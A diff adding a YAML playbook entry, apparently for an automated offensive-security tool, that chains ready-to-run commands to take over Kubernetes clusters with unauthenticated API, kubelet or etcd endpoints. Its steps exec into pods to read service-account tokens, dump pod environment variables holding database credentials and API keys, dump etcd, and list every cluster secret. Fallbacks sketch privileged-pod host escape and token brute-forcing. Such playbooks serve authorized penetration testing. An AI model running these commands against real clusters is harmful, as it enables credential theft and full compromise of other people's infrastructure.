@@ -1,0 +1,51 @@
+id: cloud_kubernetes_unauth_api
+title: "Kubernetes — unauth API server / kubelet → cluster takeover"
+phase: exploit
+mitre: ["T1190", "T1610", "T1611"]
+trigger:
+  services: ["http", "https", "kubernetes"]
+  ports:    [6443, 8443, 10250, 10255, 2379, 8080]
+  technologies: ["kubernetes", "k8s", "kube-apiserver", "kubelet"]
+keywords: ["kubernetes", "kubelet", "kube-api", "etcd", "service account token", "rbac"]
+preconditions:
+  - "TCP/6443 (API), 10250 (kubelet read-write), 10255 (kubelet read-only), or 2379 (etcd) reachable"
+steps:
+  - tool: kube-hunter
+    cmd:  "kube-hunter --remote {target}"
+    why:  "Comprehensive misconfiguration scanner — no creds needed"
+  - tool: curl
+    cmd:  "curl -sk https://{target}:6443/version; curl -sk https://{target}:6443/api/v1/namespaces"
+    why:  "Confirm anon API access + version (older + misconfigured = anon listings)"
+  - tool: kubectl
+    cmd:  "kubectl --insecure-skip-tls-verify --server=https://{target}:6443 auth can-i --list"
+    why:  "Test what the anonymous user can do — surprisingly often a lot"
+  - tool: curl
+    cmd:  "curl -sk https://{target}:10250/runningpods/ | jq ."
+    why:  "Read-write kubelet (port 10250) — list pods without auth"
+  - tool: kubeletctl
+    cmd:  "kubeletctl pods --server={target}:10250"
+    why:  "Pod listing via kubeletctl — cleaner than raw curl"
+  - tool: kubeletctl
+    cmd:  "kubeletctl exec '/bin/sh -c \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\"' -p {pod} -c {container} --server={target}:10250"
+    why:  "Exec into any pod and read the SA token — instant escalation to whatever the pod can do"
+  - tool: curl
+    cmd:  "curl -sk https://{target}:10255/pods | jq '.items[].spec.containers[].env[]?'"
+    why:  "Read-only kubelet (port 10255) — leaks env vars (DB creds, API keys) baked into pods"
+  - tool: etcdctl
+    cmd:  "etcdctl --endpoints=https://{target}:2379 get / --prefix --keys-only"
+    why:  "etcd unauth — full cluster state including secrets (base64-decoded gold)"
+  - tool: kubectl
+    cmd:  "kubectl --token={leaked_sa_token} --server=https://{target}:6443 --insecure-skip-tls-verify get secrets --all-namespaces"
+    why:  "Once you have an SA token → enumerate all secrets cluster-wide"
+  - tool: peirates
+    cmd:  "peirates"
+    why:  "Interactive cluster pwn TUI — auto-detects misconfigs from inside a compromised pod"
+expected_outcome: "Cluster admin via SA token / etcd dump → secrets, lateral movement to nodes, container escape"
+fallbacks:
+  - "Privileged pod creation via API (`kubectl create -f priv-pod.yaml`) → mount host filesystem → host root"
+  - "ImagePullSecrets in default namespace often have registry creds → pivot to private images"
+  - "If anon API blocks reads but accepts auth → token-bruteforce exposed kubeconfigs"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-kubernetes"
+  - "https://github.com/cyberark/kubeletctl"
+  - "https://github.com/inguardians/peirates"
